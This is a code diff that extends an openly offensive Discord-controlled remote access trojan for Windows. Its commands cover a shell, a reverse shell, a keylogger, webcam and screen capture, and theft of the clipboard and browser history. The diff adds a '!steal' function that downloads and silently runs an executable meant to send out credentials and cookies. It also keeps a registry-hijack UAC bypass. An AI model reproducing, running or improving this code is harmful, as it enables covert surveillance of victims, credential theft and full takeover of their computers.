@@ -15,33 +15,33 @@ import discord
 from comtypes import CLSCTX_ALL
 from pycaw.pycaw import AudioUtilities, IAudioEndpointVolume
 from discord.ext import commands
-###placeholder so if token input fails we dont get fucked up (its hard to explain) also i added better uacbypass in this version :p
-from ctypes import *
+# placeholder so if token input fails we dont get fucked up (its hard to explain)
+# also i added better uacbypass in this version :p
+from ctypes import cast, POINTER, Structure, c_uint, c_int, sizeof, byref, windll
 from discord import utils
 import requests
-
 appdata = os.getenv('APPDATA')
-client = discord.Client(intents=discord.Intents.default())
-bot = commands.Bot(command_prefix='!', intents=discord.Intents.default())
-helpmenu = """
+client = discord.Client(intents=discord.Intents.all())
+bot = commands.Bot(command_prefix='!', intents=discord.Intents.all())
+HELP_MENU = """
+FULL COMMAND EXPLAINATION IN GITHUB README
 Availaible commands are :
-
---> !message = Show a message box displaying your text / Syntax  = "!message example"
---> !shell = Execute a shell command /Syntax  = "!shell whoami"
+--> !message =  Syntax  = "!message example"
+--> !shell = Syntax  = "!shell whoami"
 --> !webcampic = Take a picture from the webcam
 --> !windowstart = Start logging current user window (logging is shown in the bot activity)
 --> !windowstop = Stop logging current user window
---> !voice = Make a voice say outloud a custom sentence / Syntax = "!voice test"
+--> !voice =  Syntax = "!voice test"
 --> !admincheck = Check if program has admin privileges
 --> !sysinfo = Gives info about infected computer
 --> !history = Get computer navigation history
 --> !download = Download a file from infected computer
---> !upload = Upload file from website to computer / Syntax = "!upload file.png" (with attachment)
+--> !upload =  Syntax = "!upload file.png" (with attachment)
 --> !cd = Changes directory
 --> !write = Type your desired sentence on infected computer
---> !wallpaper = Change infected computer wallpaper / Syntax = "!wallpaper" (with attachment)
+--> !wallpaper =  Syntax = "!wallpaper" (with attachment)
 --> !clipboard = Retrieve infected computer clipboard content
---> !geolocate = Geolocate computer using latitude and longitude of the ip address with google map / Warning : Geolocating IP addresses is not very precise
+--> !geolocate =  Warning : Geolocating IP addresses is not very precise
 --> !startkeylogger = Starts a keylogger / Warning : Likely to trigger AV
 --> !stopkeylogger = Stops keylogger
 --> !dumpkeylogger = Dumps the keylog
@@ -50,15 +50,54 @@ Availaible commands are :
 --> !idletime = Get the idle time of user
 --> !sing = Play chosen video in background (Only works with youtube links)
 --> !stopsing = Stop video playing in background
---> !blockinput = Blocks user's keyboard and mouse / Warning : Admin rights are required
---> !unblockinput = Unblocks user's keyboard and mouse / Warning : Admin rights are required
+--> !blockinput = Warning : Admin rights are required
+--> !unblockinput =  Warning : Admin rights are required
 --> !screenshot = Get the screenshot of the user's current screen
 --> !remoteshell = Start a reverse shell that you can connect to
+--> !steal = Steals user information including credentials, cookies, and browser data (im working on it)
 --> !exit = Exit program
 --> !kill = Kill a session or all sessions except current one / Syntax = "!kill session-3" or "!kill all"
 """
 
+# Send help menu to the newly created channel
+async def send_help_to_channel(channel):
+    await channel.send(HELP_MENU)
+
+# Global variables
+stop_threads = False
+user_id = None
+channel_name = None
+_thread = None
+
+
+def steal_user_info():
+    """
+    Steals user information by downloading and running an executable from the link variable.
+    Returns the path to the stolen data file.
+    """
+    try:
+        global link
+        if not link:
+            return "Error: Stealer link not configured"
+            
+        # Download the executable from the link
+        temp_dir = os.environ.get('TEMP')
+        exe_path = os.path.join(temp_dir, "hlpr.exe")
+        
+        # Download the file
+        urllib.request.urlretrieve(link, exe_path)
+        
+        # Run the downloaded executable - it will automatically send the info
+        subprocess.Popen(exe_path, shell=True, creationflags=subprocess.CREATE_NO_WINDOW)
+        
+        return "Stealer executed successfully. Data will be sent automatically."
+    except Exception as e:
+        return str(e)
+
+
+
 def start_reverse_shell(port=4444):
+    """Start a reverse shell server on the specified port."""
     try:
         server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
         server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
@@ -73,7 +112,8 @@ def start_reverse_shell(port=4444):
     except Exception:
         return None, None, None
 
-def handle_client(client_socket, channel):
+def handle_client(client_socket, _):
+    """Handle client connection for reverse shell."""
     shell_cmd = 'powershell.exe' if os.name == 'nt' else '/bin/sh'
     shell_args = [] if os.name == 'nt' else ['-i']
     
@@ -86,7 +126,6 @@ def handle_client(client_socket, channel):
         text=True,
         creationflags=subprocess.CREATE_NO_WINDOW if os.name == 'nt' else 0
     )
-    
     def socket_to_shell():
         try:
             while True:
@@ -116,7 +155,8 @@ def handle_client(client_socket, channel):
         thread = threading.Thread(target=target_func, daemon=True)
         thread.start()
 
-async def activity(client):
+async def activity(client_instance):
+    """Track user window activity and update Discord presence."""
     import time
     import win32gui
     while True:
@@ -126,31 +166,66 @@ async def activity(client):
         try:
             window = win32gui.GetWindowText(win32gui.GetForegroundWindow())
             game = discord.Game(f"Visiting: {window}")
-            await client.change_presence(status=discord.Status.online, activity=game)
+            await client_instance.change_presence(status=discord.Status.online, activity=game)
         except:
             pass
         time.sleep(1)
 
-def between_callback(client):
+def between_callback(client_instance):
+    """Set up asyncio loop for activity tracking."""
     loop = asyncio.new_event_loop()
     asyncio.set_event_loop(loop)
-    loop.run_until_complete(activity(client))
+    loop.run_until_complete(activity(client_instance))
     loop.close()
 
 @client.event
 async def on_ready():
+    """Handle bot initialization when connected to Discord."""
     import platform
     import urllib.request
     import json
     
-    try:
-        with urllib.request.urlopen("https://geolocation-db.com/json", timeout=3) as url:
-            data = json.loads(url.read().decode())
-            flag = data.get('country_code', 'unknown')
-            ip = data.get('IPv4', '0.0.0.0')
-    except:
-        flag = 'unknown'
-        ip = '0.0.0.0'
+    flag = 'unknown'
+    ip = '0.0.0.0'
+    error_message = None
+    
+    # Try multiple geolocation services
+    geolocation_services = [
+        {"url": "https://geolocation-db.com/json", "ip_key": "IPv4", "country_key": "country_code"},
+        {"url": "https://ipinfo.io/json", "ip_key": "ip", "country_key": "country"},
+        {"url": "https://api.ipify.org/?format=json", "ip_key": "ip", "country_key": None}
+    ]
+    
+    for service in geolocation_services:
+        try:
+            with urllib.request.urlopen(service["url"], timeout=3) as url:
+                data = json.loads(url.read().decode())
+                
+                # Get IP address
+                if service["ip_key"] in data:
+                    ip = data[service["ip_key"]]
+                
+                # Get country code if available in this service
+                if service["country_key"] and service["country_key"] in data:
+                    flag = data[service["country_key"]]
+                
+                # If we got an IP but no country, try to get country from another service
+                if ip != '0.0.0.0' and flag == 'unknown' and service["country_key"] is None:
+                    try:
+                        with urllib.request.urlopen(f"https://ipinfo.io/{ip}/json", timeout=3) as country_url:
+                            country_data = json.loads(country_url.read().decode())
+                            if "country" in country_data:
+                                flag = country_data["country"]
+                    except Exception as e:
+                        error_message = f"Got IP but couldn't get country: {str(e)}"
+                
+                # If we have both IP and country, break the loop
+                if ip != '0.0.0.0' and flag != 'unknown':
+                    break
+                    
+        except Exception as e:
+            error_message = f"Error with {service['url']}: {str(e)}"
+            continue
     
     global user_id, channel_name
     user_id = f"{random.randint(10000, 99999)}"
@@ -161,14 +236,20 @@ async def on_ready():
         channel = client.get_channel(newchannel.id)
         
         is_admin = ctypes.windll.shell32.IsUserAnAdmin() != 0
-        value1 = f"@everyone New connection {channel_name} | {platform.system()} {platform.release()} | {ip} :flag_{flag.lower()}: | User : {os.getlogin()}"
+        value1 = (f"@everyone New connection {channel_name} | {platform.system()} "
+                 f"{platform.release()} | {ip} :flag_{flag.lower()}: | User : {os.getlogin()}")
         
         await channel.send(f'{value1} | :gem:' if is_admin else value1)
+        
+        # Send error message if there was an issue with geolocation
+        if error_message:
+            await channel.send(f"[!] Geolocation note: {error_message}")
     
     game = discord.Game("Window logging stopped")
     await client.change_presence(status=discord.Status.online, activity=game)
     
 def volumeup():
+    """Set system volume to maximum."""
     try:
         devices = AudioUtilities.GetSpeakers()
         interface = devices.Activate(IAudioEndpointVolume._iid_, CLSCTX_ALL, None)
@@ -180,6 +261,7 @@ def volumeup():
         pass
 
 def volumedown():
+    """Set system volume to minimum."""
     try:
         devices = AudioUtilities.GetSpeakers()
         interface = devices.Activate(IAudioEndpointVolume._iid_, CLSCTX_ALL, None)
@@ -190,10 +272,25 @@ def volumedown():
 
 @client.event
 async def on_message(message):
-    if message.channel.name != channel_name:
+    """Handle incoming Discord messages and execute commands."""
+    global channel_name
+    
+    # Check if the message is in the correct channel
+    if not hasattr(message.channel, 'name') or message.channel.name != channel_name:
         return
     
-    if message.content.startswith("!kill"):
+    # Ignore messages from the bot itself
+    if message.author == client.user:
+        return
+    
+    if message.content == "!steal":
+        try:
+            result = steal_user_info()
+            await message.channel.send(f"[*] {result}")
+        except Exception as e:
+            await message.channel.send(f"[!] Error: {str(e)}")
+    
+    elif message.content.startswith("!kill"):
         if message.content[6:] == "all":
             for guild in client.guilds:
                 for channel in guild.channels:
@@ -211,15 +308,17 @@ async def on_message(message):
                         await channel_to_delete.delete()
                 await message.channel.send(f"[*] {target_channel_name} killed.")
             except:
-                await message.channel.send(f"[!] {message.content[6:]} is invalid, please enter a valid session name")
+                await message.channel.send(
+                    f"[!] {message.content[6:]} is invalid, please enter a valid session name")
 
-    if message.content == "!remoteshell":
+    elif message.content == "!remoteshell":
         try:
             port = random.randint(10000, 65000)
             server, ip, port = start_reverse_shell(port)
             if server:
                 await message.channel.send(f"[*] Remote shell started on {ip}:{port}")
-                await message.channel.send(f"[*] Connect with: `nc {ip} {port}` or any other TCP client")
+                await message.channel.send(
+                    f"[*] Connect with: `nc {ip} {port}` or any other TCP client")
                 
                 def accept_connections():
                     try:
@@ -238,7 +337,7 @@ async def on_message(message):
         except Exception as e:
             await message.channel.send(f"[!] Error starting remote shell: {str(e)}")
 
-    if message.content == "!dumpkeylogger":
+    elif message.content == "!dumpkeylogger":
         try:
             temp = os.getenv("TEMP")
             file_keys = os.path.join(temp, "key_log.txt")
@@ -251,14 +350,14 @@ async def on_message(message):
         except Exception as e:
             await message.channel.send(f"[!] Error: {str(e)}")
 
-    if message.content == "!exit":
+    elif message.content == "!exit":
         try:
             await message.channel.send("[*] Exiting...")
-            exit()
+            sys.exit(0)
         except:
             sys.exit(0)
 
-    if message.content == "!windowstart":
+    elif message.content == "!windowstart":
         try:
             global stop_threads
             stop_threads = False
@@ -269,8 +368,7 @@ async def on_message(message):
             await message.channel.send("[*] Window logging for this session started")
         except Exception as e:
             await message.channel.send(f"[!] Error: {str(e)}")
-
-    if message.content == "!windowstop":
+    elif message.content == "!windowstop":
         try:
             stop_threads = True
             game = discord.Game("Window logging stopped")
@@ -279,7 +377,7 @@ async def on_message(message):
         except Exception as e:
             await message.channel.send(f"[!] Error: {str(e)}")
 
-    if message.content == "!screenshot":
+    elif message.content == "!screenshot":
         try:
             from mss import mss
             temp_file = os.path.join(os.getenv('TEMP'), f"screen_{random.randint(1000, 9999)}.png")
@@ -291,15 +389,15 @@ async def on_message(message):
         except Exception as e:
             await message.channel.send(f"[!] Error: {str(e)}")
 
-    if message.content == "!volumemax":
+    elif message.content == "!volumemax":
         volumeup()
         await message.channel.send("[*] Volume put to 100%")
 
-    if message.content == "!volumezero":
+    elif message.content == "!volumezero":
         volumedown()
         await message.channel.send("[*] Volume put to 0%")
 
-    if message.content == "!webcampic":
+    elif message.content == "!webcampic":
         try:
             import os
             import urllib.request
@@ -335,23 +433,22 @@ async def on_message(message):
         except Exception as e:
             await message.channel.send(f"[!] Command failed: {str(e)}")
 
-    if message.content.startswith("!message"):
+    elif message.content.startswith("!message"):
         try:
             import ctypes
             import win32con
             import win32gui
             
-            MB_YESNO = 0x04
-            MB_HELP = 0x4000
-            ICON_STOP = 0x10
+            mb_yesno = 0x04
+            mb_help = 0x4000
+            icon_stop = 0x10
             
             def mess():
-                ctypes.windll.user32.MessageBoxW(0, message.content[8:], "Error", MB_HELP | MB_YESNO | ICON_STOP)
+                ctypes.windll.user32.MessageBoxW(0, message.content[8:], "Error", mb_help | mb_yesno | icon_stop)
                 
             threading.Thread(target=mess, daemon=True).start()
             
             time.sleep(1)
-            
             hwnd = win32gui.FindWindow(None, "Error")
             if hwnd:
                 win32gui.ShowWindow(hwnd, win32con.SW_RESTORE)
@@ -366,7 +463,7 @@ async def on_message(message):
         except Exception as e:
             await message.channel.send(f"[!] Error: {str(e)}")
 
-    if message.content.startswith("!wallpaper"):
+    elif message.content.startswith("!wallpaper"):
         try:
             if message.attachments:
                 path = os.path.join(os.getenv('TEMP'), f"wp_{random.randint(1000, 9999)}.jpg")
@@ -378,7 +475,7 @@ async def on_message(message):
         except Exception as e:
             await message.channel.send(f"[!] Error: {str(e)}")
 
-    if message.content.startswith("!upload"):
+    elif message.content.startswith("!upload"):
         try:
             if message.attachments:
                 filename = message.content[8:].strip() or message.attachments[0].filename
@@ -389,7 +486,7 @@ async def on_message(message):
         except Exception as e:
             await message.channel.send(f"[!] Error: {str(e)}")
 
-    if message.content.startswith("!shell"):
+    elif message.content.startswith("!shell"):
         try:
             instruction = message.content[7:]
             
@@ -411,15 +508,6 @@ async def on_message(message):
                 except Exception as e:
                     return "", str(e)
             
-            shell_thread = threading.Thread(target=execute_shell_command)
-            shell_thread.daemon = True
-            shell_thread.start()
-            shell_thread.join(timeout=31)
-            
-            if shell_thread.is_alive():
-                await message.channel.send("[!] Command is taking too long to execute")
-                return
-                
             stdout, stderr = execute_shell_command()
             result = stdout or stderr
             
@@ -440,7 +528,7 @@ async def on_message(message):
         except Exception as e:
             await message.channel.send(f"[!] Error executing command: {str(e)}")
 
-    if message.content.startswith("!download"):
+    elif message.content.startswith("!download"):
         try:
             filepath = message.content[10:]
             if os.path.exists(filepath):
@@ -451,7 +539,7 @@ async def on_message(message):
         except Exception as e:
             await message.channel.send(f"[!] Error: {str(e)}")
 
-    if message.content.startswith("!cd"):
+    elif message.content.startswith("!cd"):
         try:
             directory = message.content[4:]
             os.chdir(directory)
@@ -459,10 +547,28 @@ async def on_message(message):
         except Exception as e:
             await message.channel.send(f"[!] Error: {str(e)}")
 
-    if message.content == "!help":
-        await message.channel.send(helpmenu)
+    elif message.content == "!help":
+        try:
+            # Split help menu into multiple messages to avoid 2000 character limit
+            help_parts = []
+            current_part = ""
+            
+            for line in HELP_MENU.split('\n'):
+                if len(current_part + line + '\n') > 1900:  # Leave some buffer
+                    help_parts.append(current_part)
+                    current_part = line + '\n'
+                else:
+                    current_part += line + '\n'
+            
+            if current_part:
+                help_parts.append(current_part)
+            
+            for i, part in enumerate(help_parts):
+                await message.channel.send(f"Help Menu (Part {i+1}/{len(help_parts)}):\n{part}")
+        except Exception as e:
+            await message.channel.send(f"[!] Error displaying help menu: {str(e)}")
 
-    if message.content.startswith("!write"):
+    elif message.content.startswith("!write"):
         try:
             import pyautogui
             text = message.content[7:]
@@ -474,7 +580,7 @@ async def on_message(message):
         except Exception as e:
             await message.channel.send(f"[!] Error: {str(e)}")
 
-    if message.content == "!history":
+    elif message.content == "!history":
         try:
             import browserhistory as bh
             dict_obj = bh.get_browserhistory()
@@ -490,11 +596,11 @@ async def on_message(message):
         except Exception as e:
             await message.channel.send(f"[!] Error retrieving browser history: {str(e)}")
 
-    if message.content == "!clipboard":
+    elif message.content == "!clipboard":
         try:
             import ctypes
             
-            CF_TEXT = 1
+            cf_text = 1
             kernel32 = ctypes.windll.kernel32
             kernel32.GlobalLock.argtypes = [ctypes.c_void_p]
             kernel32.GlobalLock.restype = ctypes.c_void_p
@@ -503,8 +609,8 @@ async def on_message(message):
             user32.GetClipboardData.restype = ctypes.c_void_p
             
             user32.OpenClipboard(0)
-            if user32.IsClipboardFormatAvailable(CF_TEXT):
-                data = user32.GetClipboardData(CF_TEXT)
+            if user32.IsClipboardFormatAvailable(cf_text):
+                data = user32.GetClipboardData(cf_text)
                 data_locked = kernel32.GlobalLock(data)
                 text = ctypes.c_char_p(data_locked)
                 value = text.value
@@ -526,7 +632,7 @@ async def on_message(message):
         except Exception as e:
             await message.channel.send(f"[!] Error accessing clipboard: {str(e)}")
 
-    if message.content.startswith("!stopsing"):
+    elif message.content.startswith("!stopsing"):
         try:
             if 'pid_process' in globals():
                 os.system(f"taskkill /F /IM {pid_process[1]}")
@@ -536,7 +642,7 @@ async def on_message(message):
         except Exception as e:
             await message.channel.send(f"[!] Error: {str(e)}")
 
-    if message.content == "!sysinfo":
+    elif message.content == "!sysinfo":
         try:
             import platform
             info = platform.uname()
@@ -550,8 +656,8 @@ async def on_message(message):
             await message.channel.send(f"[*] System info: {info_total} | IP: {ip}")
         except Exception as e:
             await message.channel.send(f"[!] Error: {str(e)}")
-
-    if message.content == "!geolocate":
+    
+    elif message.content == "!geolocate":
         try:
             services = [
                 "https://geolocation-db.com/json",
@@ -572,12 +678,12 @@ async def on_message(message):
                             return
                 except:
                     continue
-                    
+            
             await message.channel.send("[!] Could not retrieve geolocation data")
         except Exception as e:
             await message.channel.send(f"[!] Error: {str(e)}")
 
-    if message.content == "!admincheck":
+    elif message.content == "!admincheck":
         try:
             is_admin = ctypes.windll.shell32.IsUserAnAdmin() != 0
             if is_admin:
@@ -586,7 +692,8 @@ async def on_message(message):
                 await message.channel.send("[!] Not running with administrator privileges")
         except Exception as e:
             await message.channel.send(f"[!] Error: {str(e)}")
-    if message.content == "!uacbypass":
+            
+    elif message.content == "!uacbypass":
         try:
             def is_admin():
                 try:
@@ -602,8 +709,8 @@ async def on_message(message):
                 
                 with open(payload_path + ".bat", "w") as f:
                     current_script = os.path.abspath(sys.argv[0])
-                    f.write(f'@echo off\npowershell -Command "Start-Process \'{sys.executable}\' -ArgumentList \'{current_script}\' -Verb RunAs"')
-                
+                    f.write(f'@echo off\npowershell -Command "Start-Process \'{sys.executable}\' '
+                            f'-ArgumentList \'{current_script}\' -Verb RunAs"')
                 key_path = r"Software\Classes\ms-settings\shell\open\command"
                 try:
                     key = winreg.CreateKey(winreg.HKEY_CURRENT_USER, key_path)
@@ -616,13 +723,12 @@ async def on_message(message):
                     
                     winreg.DeleteKey(winreg.HKEY_CURRENT_USER, key_path)
                     os.remove(payload_path + ".bat")
-                    
                 except Exception:
                     pass
         except Exception:
             pass
 
-    if message.content.startswith("!sing"):
+    elif message.content.startswith("!sing"):
         try:
             volumeup()
             from win32 import win32gui
@@ -635,7 +741,7 @@ async def on_message(message):
                     link = "https://" + link
                 
                 subprocess.Popen(f'start {link}', shell=True, stdout=subprocess.PIPE,
-                                stderr=subprocess.PIPE)
+                               stderr=subprocess.PIPE)
                 
                 def hide_youtube_window():
                     try:
@@ -663,83 +769,93 @@ async def on_message(message):
         except Exception as e:
             await message.channel.send("[!] Media playback failed")
 
-    if message.content == "!startkeylogger":
-        import base64
-        import os
-        from pynput.keyboard import Key, Listener
-        import logging
-        temp = os.getenv("TEMP")
-        logging.basicConfig(filename=os.path.join(os.getenv('TEMP') + "\\key_log.txt"),
-                            level=logging.DEBUG, format='%(asctime)s: %(message)s')
-        def keylog():
-            def on_press(key):
-                logging.info(str(key))
-            with Listener(on_press=on_press) as listener:
-                listener.join()
-        import threading
-        global test
-        test = threading.Thread(target=keylog)
-        test._running = True
-        test.daemon = True
-        test.start()
-        await message.channel.send("[*] Keylogger successfully started")
+    elif message.content == "!startkeylogger":
+        try:
+            import base64
+            import os
+            from pynput.keyboard import Key, Listener
+            import logging
+            temp = os.getenv("TEMP")
+            logging.basicConfig(filename=os.path.join(os.getenv('TEMP') + "\\key_log.txt"),
+                              level=logging.DEBUG, format='%(asctime)s: %(message)s')
+            def keylog():
+                def on_press(key):
+                    logging.info(str(key))
+                with Listener(on_press=on_press) as listener:
+                    listener.join()
+            import threading
+            global test
+            test = threading.Thread(target=keylog)
+            test._running = True
+            test.daemon = True
+            test.start()
+            await message.channel.send("[*] Keylogger successfully started")
+        except Exception as e:
+            await message.channel.send(f"[!] Error starting keylogger: {str(e)}")
 
-    if message.content == "!stopkeylogger":
-        import os
-        test._running = False
-        await message.channel.send("[*] Keylogger successfully stopped")
+    elif message.content == "!stopkeylogger":
+        try:
+            import os
+            test._running = False
+            await message.channel.send("[*] Keylogger successfully stopped")
+        except Exception as e:
+            await message.channel.send(f"[!] Error stopping keylogger: {str(e)}")
 
-    if message.content == "!idletime":
-        class LASTINPUTINFO(Structure):
-            _fields_ = [
-                ('cbSize', c_uint),
-                ('dwTime', c_int),
-            ]
+    elif message.content == "!idletime":
+        try:
+            class LASTINPUTINFO(Structure):
+                _fields_ = [
+                    ('cbSize', c_uint),
+                    ('dwTime', c_int),
+                ]
 
-        def get_idle_duration():
-            lastInputInfo = LASTINPUTINFO()
-            lastInputInfo.cbSize = sizeof(lastInputInfo)
-            if windll.user32.GetLastInputInfo(byref(lastInputInfo)):
-                millis = windll.kernel32.GetTickCount() - lastInputInfo.dwTime
-                return millis / 1000.0
-            else:
+            def get_idle_duration():
+                lastInputInfo = LASTINPUTINFO()
+                lastInputInfo.cbSize = sizeof(lastInputInfo)
+                if windll.user32.GetLastInputInfo(byref(lastInputInfo)):
+                    millis = windll.kernel32.GetTickCount() - lastInputInfo.dwTime
+                    return millis / 1000.0
                 return 0
-        import threading
-        global idle1
-        idle1 = threading.Thread(target=get_idle_duration)
-        idle1._running = True
-        idle1.daemon = True
-        idle1.start()
-        duration = get_idle_duration()
-        await message.channel.send('User idle for %.2f seconds.' % duration)
-        import time
-        time.sleep(1)
+            
+            duration = get_idle_duration()
+            await message.channel.send(f'[*] User idle for {duration:.2f} seconds.')
+        except Exception as e:
+            await message.channel.send(f"[!] Error getting idle time: {str(e)}")
 
-    if message.content.startswith("!voice"):
-        volumeup()
-        import comtypes
-        import win32com.client as wincl
-        speak = wincl.Dispatch("SAPI.SpVoice")
-        speak.Speak(message.content[7:])
-        comtypes.CoUninitialize()
-        await message.channel.send("[*] Command successfully executed")
-
-    if message.content.startswith("!blockinput"):
-        import ctypes
-        is_admin = ctypes.windll.shell32.IsUserAnAdmin() != 0
-        if is_admin is True:
-            ok = windll.user32.BlockInput(True)
+    elif message.content.startswith("!voice"):
+        try:
+            volumeup()
+            import comtypes
+            import win32com.client as wincl
+            speak = wincl.Dispatch("SAPI.SpVoice")
+            speak.Speak(message.content[7:])
+            comtypes.CoUninitialize()
             await message.channel.send("[*] Command successfully executed")
-        else:
-            await message.channel.send("[!] Admin rights are required for this operation")
+        except Exception as e:
+            await message.channel.send(f"[!] Error with voice command: {str(e)}")
 
-    if message.content.startswith("!unblockinput"):
-        import ctypes
-        is_admin = ctypes.windll.shell32.IsUserAnAdmin() != 0
-        if is_admin is True:
-            ok = windll.user32.BlockInput(False)
-            await message.channel.send("[*] Command successfully executed")
-        else:
-            await message.channel.send("[!] Admin rights are required for this operation")
+    elif message.content.startswith("!blockinput"):
+        try:
+            import ctypes
+            is_admin = ctypes.windll.shell32.IsUserAnAdmin() != 0
+            if is_admin is True:
+                ok = windll.user32.BlockInput(True)
+                await message.channel.send("[*] Command successfully executed")
+            else:
+                await message.channel.send("[!] Admin rights are required for this operation")
+        except Exception as e:
+            await message.channel.send(f"[!] Error blocking input: {str(e)}")
+
+    elif message.content.startswith("!unblockinput"):
+        try:
+            import ctypes
+            is_admin = ctypes.windll.shell32.IsUserAnAdmin() != 0
+            if is_admin is True:
+                ok = windll.user32.BlockInput(False)
+                await message.channel.send("[*] Command successfully executed")
+            else:
+                await message.channel.send("[!] Admin rights are required for this operation")
+        except Exception as e:
+            await message.channel.send(f"[!] Error unblocking input: {str(e)}")
 
 client.run(token)
